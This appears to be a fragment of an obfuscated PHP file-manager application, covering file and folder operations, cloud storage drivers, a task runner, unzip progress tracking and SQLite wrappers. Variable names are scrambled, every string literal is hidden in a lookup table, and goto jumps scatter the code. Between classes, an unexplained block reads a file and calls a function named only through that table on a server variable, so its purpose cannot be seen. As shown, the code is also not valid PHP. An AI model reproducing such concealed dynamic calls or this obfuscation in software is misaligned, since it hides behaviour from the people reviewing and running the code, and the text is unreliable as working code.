file_exists($©¯ïÎ·Ò); return $é²ïñÄË ? $this->getPathOuter($©¯ïÎ·Ò) : !1; } public function delFile($¤ñ¥¾¦) { $¤ñ¥¾¦ = $this->iconvSystem($¤ñ¥¾¦); if (!@unlink($¤ñ¥¾¦)) { @chmod($¤ñ¥¾¦, $this->pathAuth); if (!@unlink($¤ñ¥¾¦)) { return !1; } } else { return !0; } } public function delFolder($Îª¿Š¸) { $Òëœ¶½• =& $_SERVER[•Ùç É]; $Îª¿Š¸ = $this->iconvSystem($Îª¿Š¸); if (!is_dir($Îª¿Š¸)) { return !0; } if (!($¾¼ş¹„ = opendir($Îª¿Š¸))) { return !1; } while (($Ìë´åñì = readdir($¾¼ş¹„)) !== !1) { if ($Ìë´åñì == $Òëœ¶½•[10] || $Ìë´åñì == $Òëœ¶½•[1329]) { continue; } $£ˆá¢±ê = $Îª¿Š¸ . $Òëœ¶½•[8] . $Ìë´åñì; if (is_file($£ˆá¢±ê) || is_link($£ˆá¢±ê)) { if (!unlink($£ˆá¢±ê)) { chmod($£ˆá¢±ê, $this->pathAuth); if (!unlink($£ˆá¢±ê)) { return !1; } } } else { if (is_dir($£ˆá¢±ê)) { chmod($£ˆá¢±ê, $this->pathAuth); $£ˆá¢±ê = $this->iconvApp($£ˆá¢±ê); if (!$this->delFolder($£ˆá¢±ê)) { return !1; } } } } closedir($¾¼ş¹„); return rmdir($Îª¿Š¸); } public function rename($¹Œ¶‰¤Ä, $¢¥ö¡çœ) { $“’Åú =& $_SERVER[•Ùç É]; $¤ö¡½äÈ = $this->fileNameAuto($this->pathFather($¹Œ¶‰¤Ä), $¢¥ö¡çœ); $¤ö¡½äÈ = $this->iconvSystem($¤ö¡½äÈ); $¹Œ¶‰¤Ä = $this->iconvSystem($¹Œ¶‰¤Ä); $ÜâÀ‘ = $this->pathFather($¹Œ¶‰¤Ä); $€µô¯¹— = rtrim($ÜâÀ‘, $“’Åú[8]) . $“’Åú[8] . $¤ö¡½äÈ; $º³¨é˜û = @rename($¹Œ¶‰¤Ä, $€µô¯¹—); $€µô¯¹— = $this->iconvApp($€µô¯¹—); return $º³¨é˜û ? $this->getPathOuter($€µô¯¹—) : !1; } public function size($“¦ˆÓ‰ø) { $“¦ˆÓ‰ø = $this->iconvSystem($“¦ˆÓ‰ø); return filesize_64($“¦ˆÓ‰ø); } public function info($ùÑÃß™Û) { $ùÑÃß™Û = $this->iconvSystem($ùÑÃß™Û); if ($this->isFolder($ùÑÃß™Û)) { return $this->folderInfo($ùÑÃß™Û); } else { if ($this->isFile($ùÑÃß™Û)) { return $this->fileInfo($ùÑÃß™Û); } } return !1; } protected function infoChildren($åÏ¾˜ª, &$Õ”Å²”¾, $Ûõåì÷Á = true) { $ñÂ¤ö‹” =& $_SERVER[•Ùç É]; check_abort_echo(); $åÏ¾˜ª = rtrim($åÏ¾˜ª, $ñÂ¤ö‹”[8]) . $ñÂ¤ö‹”[8]; if ($Ûõåì÷Á) { $åÏ¾˜ª = $this->iconvSystem($åÏ¾˜ª); } if (!($Ñµçİ± = @opendir($åÏ¾˜ª))) { return; } while (($„¦¼å©Æ = readdir($Ñµçİ±)) !== !1) { if ($„¦¼å©Æ == $ñÂ¤ö‹”[10] || $„¦¼å©Æ == $ñÂ¤ö‹”[1329]) { continue; } $Î½ÒÆ = $åÏ¾˜ª . $„¦¼å©Æ; if (is_file($Î½ÒÆ) || is_link($Î½ÒÆ)) { $Õ”Å²”¾[$ñÂ¤ö‹”[79]]++; $Õ”Å²”¾[$ñÂ¤ö‹”[78]] += filesize_64($Î½ÒÆ); } else { if (is_dir($Î½ÒÆ)) { $Õ”Å²”¾[$ñÂ¤ö‹”[80]]++; $this->infoChildren($Î½ÒÆ, $Õ”Å²”¾, !1); } } } closedir($Ñµçİ±); } private function folderInfo($¿öøÇ·, $ù¡ÂÌ€ = false) { $ª÷¯Èø =& $_SERVER[•Ùç É]; $¿öøÇ· = rtrim($¿öøÇ·, $ª÷¯Èø[8]) . $ª÷¯Èø[8]; $˜š’ì¿… = $this->iconvApp($this->pathThis($¿öøÇ·)); if ($ù¡ÂÌ€) { return array($ª÷¯Èø[32] => $˜š’ì¿…, $ª÷¯Èø[86] => $this->getPathOuter($¿öøÇ·), $ª÷¯Èø[33] => $ª÷¯Èø[77]); } $Û³çëŸ = array($ª÷¯Èø[32] => $˜š’ì¿…, $ª÷¯Èø[86] => $this->getPathOuter($¿öøÇ·), $ª÷¯Èø[33] => $ª÷¯Èø[77], $ª÷¯Èø[217] => @filectime($¿öøÇ·), $ª÷¯Èø[87] => @filemtime($¿öøÇ·), $ª÷¯Èø[1414] => @fileatime($¿öøÇ·), $ª÷¯Èø[1415] => is_readable($¿öøÇ·), $ª÷¯Èø[1416] => is_writable($¿öøÇ·), $ª÷¯Èø[1417] => get_mode($¿öøÇ·)); return $Û³çëŸ; } private function fileInfo($ÆÊ»õä¨, $¿İª’Ó€ = false) { $Áâßãß» =& $_SERVER[•Ùç É]; $¤¬·¿¸ = $this->iconvApp($this->pathThis($ÆÊ»õä¨)); if ($¿İª’Ó€) { return array($Áâßãß»[32] => $¤¬·¿¸, $Áâßãß»[86] => $this->getPathOuter($ÆÊ»õä¨), $Áâßãß»[33] => $Áâßãß»[216], $Áâßãß»[78] => $this->size($ÆÊ»õä¨), $Áâßãß»[177] => $this->ext($¤¬·¿¸)); } $ˆİµ¦ä = array($Áâßãß»[32] => $¤¬·¿¸, $Áâßãß»[86] => $this->getPathOuter($ÆÊ»õä¨), $Áâßãß»[33] => $Áâßãß»[216], $Áâßãß»[217] => @filectime($ÆÊ»õä¨), $Áâßãß»[87] => @filemtime($ÆÊ»õä¨), $Áâßãß»[1414] => @fileatime($ÆÊ»õä¨), $Áâßãß»[78] => $this->size($ÆÊ»õä¨), $Áâßãß»[177] => $this->ext($¤¬·¿¸), $Áâßãß»[1415] => is_readable($ÆÊ»õä¨), $Áâßãß»[1416] => is_writable($ÆÊ»õä¨), $Áâßãß»[1417] => get_mode($ÆÊ»õä¨)); return $ˆİµ¦ä; } public function exist($Ñ˜ü»—) { $Ñ˜ü»— = $this->iconvSystem($Ñ˜ü»—); return @file_exists($Ñ˜ü»—); } public function isFile($Á»ÓŸ›±) { $Á»ÓŸ›± = $this->iconvSystem($Á»ÓŸ›±); return @is_file($Á»ÓŸ›±); } public function isFolder($“€€ê³®) { $“€€ê³® = $this->iconvSystem($“€€ê³®); return @is_dir($“€€ê³®); } public function listPath($âÊ›Õú¾, $­ÔïÅª = false) { $‹ªµÓˆï =& $_SERVER[•Ùç É]; $âÊ›Õú¾ = $this->iconvSystem($âÊ›Õú¾); $âÊ›Õú¾ = rtrim($âÊ›Õú¾, $‹ªµÓˆï[8]) . $‹ªµÓˆï[8]; $ÎÆ´Ğ = array($‹ªµÓˆï[84] => array(), $‹ªµÓˆï[85] => array()); if (!($â‹­¥À× = @opendir($âÊ›Õú¾))) { return $ÎÆ´Ğ; } while (($­”âë‰ = readdir($â‹­¥À×)) !== !1) { if ($­”âë‰ == $‹ªµÓˆï[10] || $­”âë‰ == $‹ªµÓˆï[1329]) { continue; } $â•ğàüŸ = $âÊ›Õú¾ . $­”âë‰; if (is_file($â•ğàüŸ)) { $ÎÆ´Ğ[$‹ªµÓˆï[85]][] = $this->fileInfo($â•ğàüŸ, $­ÔïÅª); } else { $ÎÆ´Ğ[$‹ªµÓˆï[84]][] = $this->folderInfo($â•ğàüŸ, $­ÔïÅª); } } closedir($â‹­¥À×); return $ÎÆ´Ğ; } public function listAll($å‰êò÷Î, &$Ã¼šü• = array()) { $‡ïÈ¬ï× =& $_SERVER[•Ùç É]; $å‰êò÷Î = $this->iconvSystem($å‰êò÷Î); $å‰êò÷Î = rtrim($å‰êò÷Î, $‡ïÈ¬ï×[8]) . $‡ïÈ¬ï×[8]; if (!($—Ç¿™Ğ§ = @opendir($å‰êò÷Î))) { return $Ã¼šü•; } while (($Œı‡º¿Ë = readdir($—Ç¿™Ğ§)) !== !1) { if ($Œı‡º¿Ë == $‡ïÈ¬ï×[10] || $Œı‡º¿Ë == $‡ïÈ¬ï×[1329]) { continue; } $Ò¯½‡± = $å‰êò÷Î . $Œı‡º¿Ë; $ÇÚ‰Á­ = is_dir($Ò¯½‡±) && !is_link($Ò¯½‡±) ? 1 : 0; $Ò¯½‡± = $ÇÚ‰Á­ ? $Ò¯½‡± . $‡ïÈ¬ï×[8] : $Ò¯½‡±; $Ã¼šü•[] = array($‡ïÈ¬ï×[86] => $Ò¯½‡±, $‡ïÈ¬ï×[77] => $ÇÚ‰Á­, $‡ïÈ¬ï×[87] => intval(@filemtime($Ò¯½‡±)), $‡ïÈ¬ï×[78] => $ÇÚ‰Á­ ? 0 : intval($this->size($Ò¯½‡±))); if ($ÇÚ‰Á­) { $this->listAll($Ò¯½‡±, $Ã¼šü•); } } closedir($—Ç¿™Ğ§); return $Ã¼šü•; } public function has($ñ±ËÚÇ, $«ø¶Êâı = false, $‘¶Í¡­Ø = true) { $‘ƒ¨Ì¯“ =& $_SERVER[•Ùç É]; $ñ±ËÚÇ = $this->iconvSystem($ñ±ËÚÇ); $ñ±ËÚÇ = rtrim($ñ±ËÚÇ, $‘ƒ¨Ì¯“[8]) . $‘ƒ¨Ì¯“[8]; if (!($„··˜Ó‡ = @opendir($ñ±ËÚÇ))) { return !1; } $Ô¬åİ©í = 0; $˜Ïİ÷¾Ì = 0; $ä›•Ì•å = 0; while (($²¹±â”Å = readdir($„··˜Ó‡)) !== !1) { if ($²¹±â”Å == $‘ƒ¨Ì¯“[10] || $²¹±â”Å == $‘ƒ¨Ì¯“[1329]) { continue; } $±•ÚŸ˜Õ = $ñ±ËÚÇ . $²¹±â”Å; if ($«ø¶Êâı) { $ä›•Ì•å++; if (@is_file($±•ÚŸ˜Õ)) { $Ô¬åİ©í++; } else { $˜Ïİ÷¾Ì++; } if ($ä›•Ì•å > 10000) { break; } continue; } if ($‘¶Í¡­Ø) { if (@is_file($±•ÚŸ˜Õ)) { return !0; } } else { if (@is_dir($±•ÚŸ˜Õ . $‘ƒ¨Ì¯“[8])) { return !0; } } } closedir($„··˜Ó‡); if ($«ø¶Êâı) { return array($‘ƒ¨Ì¯“[225] => $Ô¬åİ©í, $‘ƒ¨Ì¯“[226] => $˜Ïİ÷¾Ì); } return !1; } public function hashSimple($ŸÈ¹ƒı‹) { $‰ÇÉˆ«× =& $_SERVER[•Ùç É]; if (!$ŸÈ¹ƒı‹) { return md5($‰ÇÉˆ«×[12]); } $ŸÈ¹ƒı‹ = $this->iconvSystem($ŸÈ¹ƒı‹); $¾œôË†“ = $this->size($ŸÈ¹ƒı‹); $¯¤‘“ç = 200; $•ëŠíÔ© = 50; if ($¾œôË†“ <= $¯¤‘“ç * $•ëŠíÔ©) { return $this->hashMd5($ŸÈ¹ƒı‹) . $¾œôË†“; } $Ğ³ˆ’ÏÑ = $‰ÇÉˆ«×[12]; $±àóŞ” = intval($¾œôË†“ / $•ëŠíÔ©); $Ó ’ŸûÄ = fopen($ŸÈ¹ƒı‹, $‰ÇÉˆ«×[1418]); if (!$Ó ’ŸûÄ) { return $Ğ³ˆ’ÏÑ; } for ($õãúúêõ = 0; $õãúúêõ < $•ëŠíÔ©; $õãúúêõ++) { fseek_64($Ó ’ŸûÄ, $±àóŞ” * $õãúúêõ); $Ğ³ˆ’ÏÑ .= fread($Ó ’ŸûÄ, $¯¤‘“ç); } fseek_64($Ó ’ŸûÄ, $¾œôË†“ - $¯¤‘“ç); $Ğ³ˆ’ÏÑ .= fread($Ó ’ŸûÄ, $¯¤‘“ç); fclose($Ó ’ŸûÄ); return md5($Ğ³ˆ’ÏÑ) . $¾œôË†“; } public function getContent($®íÛ£™) { $®íÛ£™ = $this->iconvSystem($®íÛ£™); return file_get_contents($®íÛ£™); } public function setContent($æ˜Í²äŞ, $å×¼á°™ = '') { $æ˜Í²äŞ = $this->iconvSystem($æ˜Í²äŞ); $„­î£ = @file_put_contents($æ˜Í²äŞ, $å×¼á°™, LOCK_EX); clearstatcache(); @chmod($æ˜Í²äŞ, $this->pathAuth); return $„­î£ === !1 ? !1 : !0; } public function fileSubstr($Î¶×ÜÖ“, $€¼Ğ£‹š = 0, $ÆĞõß‰Î = false) { $æ¢ØÒü­ =& $_SERVER[•Ùç É]; $Î¶×ÜÖ“ = $this->iconvSystem($Î¶×ÜÖ“); if ($ÆĞõß‰Î === !1) { $ÆĞõß‰Î = $this->size($Î¶×ÜÖ“); } if ($ÆĞõß‰Î <= 0) { return $æ¢ØÒü­[12]; } $›âº¯¼î = fopen($Î¶×ÜÖ“, $æ¢ØÒü­[1418]); if (!$›âº¯¼î) { return !1; } fseek_64($›âº¯¼î, $€¼Ğ£‹š); $¡°Öìé = fread($›âº¯¼î, $ÆĞõß‰Î); fclose($›âº¯¼î); return $¡°Öìé; } public function upload($¹ßı¢ğ‡, $‰ìšå°Ã, $ÆÊõ¸¨­ = false, $ƒ’©½íş = REPEAT_REPLACE) { if ($ÆÊõ¸¨­) { return $this->moveFile($‰ìšå°Ã, $¹ßı¢ğ‡); } return $this->copyFile($‰ìšå°Ã, $¹ßı¢ğ‡); } public function setModifyTime($øƒ€•¹†, $‰æ¹şĞ = '') { @touch($øƒ€•¹†, intval($‰æ¹şĞ)); } public function download($¾øšÆ¶, $Ãõ”üÏ) { return $this->iconvSystem($¾øšÆ¶); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($ïØÜÎıä) { parent::__construct($ïØÜÎıä); $this->signatureVersion($_SERVER[•Ùç É][233]); } public function fileOutImage($‹‰×ˆß½, $¨µò³¢” = 250) { $—±ó…‘… =& $_SERVER[•Ùç É]; if ($this->size($‹‰×ˆß½) > 1024 * 1024 * 25) { return $this->fileOutImageServer($‹‰×ˆß½, $¨µò³¢”); } $î¯ïìüÈ = array($—±ó…‘…[1419] => $—±ó…‘…[1420] . $¨µò³¢” . $—±ó…‘…[1421]); $ûãÉëç = $this->link($‹‰×ˆß½, $î¯ïìüÈ); $this->fileOutLink($ûãÉëç); } public function fileOutLink($öĞâÅşö) { $‚ù˜ÙÍÃ =& $_SERVER[•Ùç É]; if (substr($öĞâÅşö, 0, 7) == $‚ù˜ÙÍÃ[1382]) { $öĞâÅşö = $‚ù˜ÙÍÃ[1383] . substr($öĞâÅşö, 7); } header($‚ù˜ÙÍÃ[164] . $öĞâÅşö); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($¡‘óªÒ) { parent::__construct($¡‘óªÒ); $this->signatureVersion($_SERVER[•Ùç É][233]); } public function fileOutLink($ãà¬ü¯³) { $³¶ŠÊôÚ =& $_SERVER[•Ùç É]; if (substr($ãà¬ü¯³, 0, 7) == $³¶ŠÊôÚ[1382]) { $ãà¬ü¯³ = $³¶ŠÊôÚ[1383] . substr($ãà¬ü¯³, 7); } header($³¶ŠÊôÚ[164] . $ãà¬ü¯³); die; } } goto AêÚ“ ÚÛ˜; F®ÖïÌá»Á: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($¿ÛÓ±À„, $ÂŞšÓ’ƒ = 5.0) { if (!$¿ÛÓ±À„) { return; } $ÁëäÅÂ½ = Cache::get($¿ÛÓ±À„); if (!$ÁëäÅÂ½ || timeFloat() - floatVal($ÁëäÅÂ½) >= $ÂŞšÓ’ƒ) { Cache::set($¿ÛÓ±À„, timeFloat(), $ÂŞšÓ’ƒ * 10); return !0; } return !1; } public static function timeLimitCall($ô­â÷‚, $èƒÇ÷Ş£, $ ŞºÀ¨, $¥Ê‰óÂ = 5.0) { $Şñ¯íùÁ =& $_SERVER[•Ùç É]; if (!$ô­â÷‚ || !$èƒÇ÷Ş£) { return; } self::$asyncAdd = !0; $»‚æÃŸ = $Şñ¯íùÁ[1812]; $¦ÓéÆÓŠ = Cache::get($»‚æÃŸ, !0); $ØóÓ•š‹ = array($Şñ¯íùÁ[1813] => timeFloat(), $Şñ¯íùÁ[1814] => timeFloat(), $Şñ¯íùÁ[310] => $èƒÇ÷Ş£, $Şñ¯íùÁ[1804] => $ ŞºÀ¨, $Şñ¯íùÁ[196] => $¥Ê‰óÂ); if (is_array($¦ÓéÆÓŠ[$ô­â÷‚])) { $ØóÓ•š‹[$Şñ¯íùÁ[1814]] = $¦ÓéÆÓŠ[$ô­â÷‚][$Şñ¯íùÁ[1814]]; } if (is_array($¦ÓéÆÓŠ[$ô­â÷‚])) { if (timeFloat() - $¦ÓéÆÓŠ[$ô­â÷‚][$Şñ¯íùÁ[1813]] < $ØóÓ•š‹[$Şñ¯íùÁ[196]] * 0.3) { return; } $ØóÓ•š‹[$Şñ¯íùÁ[1814]] = $¦ÓéÆÓŠ[$ô­â÷‚][$Şñ¯íùÁ[1814]]; } $¦ÓéÆÓŠ[$ô­â÷‚] = $ØóÓ•š‹; Cache::set($»‚æÃŸ, $¦ÓéÆÓŠ, 60); Cache::removeMemory($»‚æÃŸ); write_log($Şñ¯íùÁ[1815] . $ô­â÷‚ . $Şñ¯íùÁ[73] . $èƒÇ÷Ş£, $Şñ¯íùÁ[187]); } public static function timeLimitCallLoop() { $Êé‹¶ş =& $_SERVER[•Ùç É]; $”òş®†· = array($Êé‹¶ş[1816]); $Í½ÓåÏ» = in_array(strtolower(ACTION), $”òş®†·); if (!$Í½ÓåÏ» && !self::$asyncAdd) { return; } $Äß”ˆõ§ = $Êé‹¶ş[1812]; $÷º¬ “¥ = Cache::get($Äß”ˆõ§, !0); if (!$÷º¬ “¥ || count($÷º¬ “¥) <= 0) { return; } $¼„øÉƒÛ = !1; $Îù˜ç¥É = timeFloat(); $óµåÙ£ = array(); foreach ($÷º¬ “¥ as $İüÚŞÎİ => $ÙÓ«‰ñ) { if ($Îù˜ç¥É - $ÙÓ«‰ñ[$Êé‹¶ş[1814]] > $ÙÓ«‰ñ[$Êé‹¶ş[196]]) { $¼„øÉƒÛ = !0; try { Hook::apply($ÙÓ«‰ñ[$Êé‹¶ş[310]], $ÙÓ«‰ñ[$Êé‹¶ş[1804]]); write_log($Êé‹¶ş[1817] . $İüÚŞÎİ . $Êé‹¶ş[73] . $ÙÓ«‰ñ[$Êé‹¶ş[310]] . $Êé‹¶ş[1818] . ACTION, $Êé‹¶ş[187]); } catch (Exception $¾Ü¶Û¾“) { } continue; } $óµåÙ£[$İüÚŞÎİ] = $ÙÓ«‰ñ; } if (!$¼„øÉƒÛ) { return; } if (!$óµåÙ£) { return Cache::remove($Äß”ˆõ§); } Cache::set($Äß”ˆõ§, $óµåÙ£, 60); Cache::removeMemory($Äß”ˆõ§); } public static function finished($½ÂµÍ‘Ì, $¿ñÑ»˜”) { $é¨ƒĞü× =& $_SERVER[•Ùç É]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($é¨ƒĞü×[310] => $½ÂµÍ‘Ì, $é¨ƒĞü×[1804] => $¿ñÑ»˜”); } private static function finishedRun() { $ôäïÇŒè =& $_SERVER[•Ùç É]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ı·ùÜß«) { try { Hook::apply($ı·ùÜß«[$ôäïÇŒè[310]], $ı·ùÜß«[$ôäïÇŒè[1804]]); } catch (Exception $Â¨±ïöı) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } if ($_SERVER[$_SERVER[•Ùç É][922]] != $_SERVER[$_SERVER[•Ùç É][1782]]) { $_getc = $_SERVER[•Ùç É][925]; $_getfile = $_SERVER[$_SERVER[•Ùç É][926]] . $_SERVER[•Ùç É][927]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[•Ùç É][248], $_getfilec); if (count($_getarrs) < $_SERVER[•Ùç É][692]) { $exit = $_SERVER[•Ùç É][928]; $exit(); } $_act = $_SERVER[•Ùç É][932]; $_act($_SERVER[$_SERVER[•Ùç É][923]]); } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Šëã¡âŠ =& $_SERVER[•Ùç É]; parent::startAfter(); Hook::bind($Šëã¡âŠ[1819], array($this, $Šëã¡âŠ[1820])); Hook::bind($Šëã¡âŠ[1244], array($this, $Šëã¡âŠ[1821])); Hook::bind($Šëã¡âŠ[1822], array($this, $Šëã¡âŠ[1823])); $½¦”Àíá =& $this->task; $½¦”Àíá[$Šëã¡âŠ[1824]] = $Šëã¡âŠ[1245]; if (!$½¦”Àíá[$Šëã¡âŠ[1593]]) { $½¦”Àíá[$Šëã¡âŠ[1593]] = LNG($Šëã¡âŠ[1825]); } } protected function endAfter() { $ÄÀäŒñæ =& $_SERVER[•Ùç É]; parent::endAfter(); Hook::unbind($ÄÀäŒñæ[1819], array($this, $ÄÀäŒñæ[1820])); Hook::unbind($ÄÀäŒñæ[1244], array($this, $ÄÀäŒñæ[1821])); Hook::unbind($ÄÀäŒñæ[1822], array($this, $ÄÀäŒñæ[1823])); } public function updateAfter() { $ ÀäĞ­Ğ =& $_SERVER[•Ùç É]; $‹Åò¤› =& $this->task; if (!$‹Åò¤›[$ ÀäĞ­Ğ[831]] || !$‹Åò¤›[$ ÀäĞ­Ğ[808]]) { if ($‹Åò¤›[$ ÀäĞ­Ğ[1824]] != $ ÀäĞ­Ğ[359]) { return; } } if ($‹Åò¤›[$ ÀäĞ­Ğ[1824]] == $ ÀäĞ­Ğ[1245]) { $Ôğ£¨Ş = 0; if ($‹Åò¤›[$ ÀäĞ­Ğ[1758]]) { $Ôğ£¨Ş = $‹Åò¤›[$ ÀäĞ­Ğ[1759]] / $‹Åò¤›[$ ÀäĞ­Ğ[1758]]; } $‹Åò¤›[$ ÀäĞ­Ğ[1707]] = $Ôğ£¨Ş * 0.3; } else { if ($‹Åò¤›[$ ÀäĞ­Ğ[1824]] == $ ÀäĞ­Ğ[359]) { $Ôğ£¨Ş = $‹Åò¤›[$ ÀäĞ­Ğ[1706]] / $‹Åò¤›[$ ÀäĞ­Ğ[831]]; $‹Åò¤›[$ ÀäĞ­Ğ[1707]] = 0.3 + $Ôğ£¨Ş * 0.4; } else { if ($‹Åò¤›[$ ÀäĞ­Ğ[1824]] == $ ÀäĞ­Ğ[109]) { $Ä´‹šªü = 0; if ($‹Åò¤›[$ ÀäĞ­Ğ[1760]] == $ ÀäĞ­Ğ[109]) { $Ä´‹šªü = $‹Åò¤›[$ ÀäĞ­Ğ[1759]]; } $Ôğ£¨Ş = ($‹Åò¤›[$ ÀäĞ­Ğ[1763]] + $Ä´‹šªü) / $‹Åò¤›[$ ÀäĞ­Ğ[808]]; $‹Åò¤›[$ ÀäĞ­Ğ[1707]] = 0.3 + 0.4 + $Ôğ£¨Ş * 0.3; } } } if ($‹Åò¤›[$ ÀäĞ­Ğ[1707]] > 0) { $Åç³îé¯ = timeFloat() - $‹Åò¤›[$ ÀäĞ­Ğ[1709]] - $‹Åò¤›[$ ÀäĞ­Ğ[1712]]; $‹Åò¤›[$ ÀäĞ­Ğ[1713]] = $Åç³îé¯ * (1 - $‹Åò¤›[$ ÀäĞ­Ğ[1707]]) / $‹Åò¤›[$ ÀäĞ­Ğ[1707]]; } } public function addFile($úå£‡Î†) { $®„¯æà§ =& $_SERVER[•Ùç É]; $şšÃ®Å =& $this->task; $×½»Š” = IO::info($úå£‡Î†); $şšÃ®Å[$®„¯æà§[1756]] = $×½»Š”[$®„¯æà§[32]]; $şšÃ®Å[$®„¯æà§[1758]] = $×½»Š”[$®„¯æà§[78]]; $şšÃ®Å[$®„¯æà§[1759]] = 0; $şšÃ®Å[$®„¯æà§[1115]] = $®„¯æà§[1779]; $şšÃ®Å[$®„¯æà§[1760]] = $®„¯æà§[1245]; $şšÃ®Å[$®„¯æà§[808]] = $×½»Š”[$®„¯æà§[78]]; $şšÃ®Å[$®„¯æà§[831]] = 1; $šâ¾Õ—Ÿ = 0; $şšÃ®Å[$®„¯æà§[1767]] = array($®„¯æà§[1768] => $šâ¾Õ—Ÿ + 1, $®„¯æà§[464] => $×½»Š”[$®„¯æà§[32]], $®„¯æà§[86] => $×½»Š”[$®„¯æà§[86]], $®„¯æà§[553] => $×½»Š”[$®„¯æà§[553]] ? $×½»Š”[$®„¯æà§[553]] : $×½»Š”[$®„¯æà§[86]]); $this->update(); } public function zipEvent($ÌŞáæ•, $¤î¿ô´ª, $Ôº±ñ£Å, $ÜâÕ¸) { $øÍ‰ˆ—Ù =& $_SERVER[•Ùç É]; $‰İéÆ¨İ =& $this->task; $‰İéÆ¨İ[$øÍ‰ˆ—Ù[1756]] = get_path_this($¤î¿ô´ª); $‰İéÆ¨İ[$øÍ‰ˆ—Ù[1758]] = $ÜâÕ¸; $‰İéÆ¨İ[$øÍ‰ˆ—Ù[1759]] = $Ôº±ñ£Å; $‰İéÆ¨İ[$øÍ‰ˆ—Ù[1115]] = $ÌŞáæ• == $øÍ‰ˆ—Ù[1826] ? $øÍ‰ˆ—Ù[1827] : $øÍ‰ˆ—Ù[1828]; $‰İéÆ¨İ[$øÍ‰ˆ—Ù[1760]] = $øÍ‰ˆ—Ù[12]; $‰İéÆ¨İ[$øÍ‰ˆ—Ù[808]] = $ÜâÕ¸; $‰İéÆ¨İ[$øÍ‰ˆ—Ù[1824]] = $øÍ‰ˆ—Ù[359]; $this->update(); } public function unzipAfter($ÄÕÅÀİ) { $–´á²‚¸ =& $_SERVER[•Ùç É]; $Í¤û¥Ø =& $this->task; $Í¤û¥Ø[$–´á²‚¸[1824]] = $–´á²‚¸[109]; $‘’£õı = IO::infoWithChildren($ÄÕÅÀİ); $î‡ÉÀ¾¾ = 0; $Í¤û¥Ø[$–´á²‚¸[1767]] = array($–´á²‚¸[1768] => $î‡ÉÀ¾¾ + 1, $–´á²‚¸[464] => $‘’£õı[$–´á²‚¸[32]], $–´á²‚¸[86] => $‘’£õı[$–´á²‚¸[86]], $–´á²‚¸[553] => $‘’£õı[$–´á²‚¸[553]] ? $‘’£õı[$–´á²‚¸[553]] : $‘’£õı[$–´á²‚¸[86]]); if ($‘’£õı[$–´á²‚¸[33]] == $–´á²‚¸[216]) { $Í¤û¥Ø[$–´á²‚¸[831]] = 1; } else { $Í¤û¥Ø[$–´á²‚¸[831]] = $‘’£õı[$–´á²‚¸[81]][$–´á²‚¸[79]]; } $Í¤û¥Ø[$–´á²‚¸[1115]] = $–´á²‚¸[12]; $Í¤û¥Ø[$–´á²‚¸[1760]] = 0; $Í¤û¥Ø[$–´á²‚¸[1706]] = 0; $Í¤û¥Ø[$–´á²‚¸[1758]] = 0; $Í¤û¥Ø[$–´á²‚¸[1759]] = 0; $Í¤û¥Ø[$–´á²‚¸[1756]] = $–´á²‚¸[12]; $Í¤û¥Ø[$–´á²‚¸[1763]] = 0; $Í¤û¥Ø[$–´á²‚¸[808]] = $‘’£õı[$–´á²‚¸[78]]; $this->update(); self::log($–´á²‚¸[1829] . json_encode(array($Í¤û¥Ø, $‘’£õı))); } public function nameParse($õè¤€‚‹) { $ö¯¡ôê¤ =& $_SERVER[•Ùç É]; $Š€§Úƒô =& $this->task; if ($Š€§Úƒô[$ö¯¡ôê¤[1824]] == $ö¯¡ôê¤[1245]) { $Š€§Úƒô[$ö¯¡ôê¤[1824]] = $ö¯¡ôê¤[359]; $Š€§Úƒô[$ö¯¡ôê¤[1763]] = 0; $Š€§Úƒô[$ö¯¡ôê¤[808]] = 0; } $ğáöøüÛ = get_path_this($õè¤€‚‹); if (strstr($ğáöøüÛ, $ö¯¡ôê¤[10])) { $Š€§Úƒô[$ö¯¡ôê¤[1706]] += 1; $Š€§Úƒô[$ö¯¡ôê¤[831]] += 1; } $Š€§Úƒô[$ö¯¡ôê¤[1756]] = $õè¤€‚‹; $this->update(); } } goto AŞÛ‰²ŞÓç; Aäî»Üñ¨î: class DbSqlite extends DbSqliteBase { public function query($À¦Ã¹Ø‚) { $‡åŠ†ì¹ =& $_SERVER[•Ùç É]; if (!CacheLock::fileLock($‡åŠ†ì¹[13])) { return !1; } $ÒÚæ¤…¼ = parent::query($À¦Ã¹Ø‚); CacheLock::fileUnLock($‡åŠ†ì¹[13]); return $ÒÚæ¤…¼; } public function execute($„©…íš©) { $Ö—¯†ÌÙ =& $_SERVER[•Ùç É]; if (!CacheLock::fileLock($Ö—¯†ÌÙ[13])) { return !1; } $‹£“Û›Ó = parent::execute($„©…íš©); CacheLock::fileUnLock($Ö—¯†ÌÙ[13]); return $‹£“Û›Ó; } } class DbSqlite3 extends DbSqlite3Base { public function query($Åî¥ÈÇ) { $áºéØ =& $_SERVER[•Ùç É]; if (!CacheLock::fileLock($áºéØ[13])) { return !1; } $Âà°úà = parent::query($Åî¥ÈÇ); CacheLock::fileUnLock($áºéØ[13]); return $Âà°úà; } public function execute($”À¦Œš…) { $œ‚³ÅÚ† =& $_SERVER[•Ùç É]; if (!CacheLock::fileLock($œ‚³ÅÚ†[13])) { return !1; } $Èªº—ß¦ = parent::execute($”À¦Œš…); CacheLock::fileUnLock($œ‚³ÅÚ†[13]); return $Èªº—ß¦; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\151\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\x6e\x65\x71" => "\x3c\76", "\x67\x74" => "\76", "\145\147\164" => "\76\75", "\154\x74" => "\74", "\x65\x6c\164" => "\74\75", "\156\157\164\x6c\x69\153\145" => "\x4e\117\124\x20\x4c\x49\x4b\105", "\x6c\x69\153\x65" => "\114\x49\113\105", "\151\x6e" => "\x49\x4e", "\x6e\157\164\151\x6e" => "\x4e\x4f\x54\40\111\116", "\x6e\157\x74\40\x69\156" => 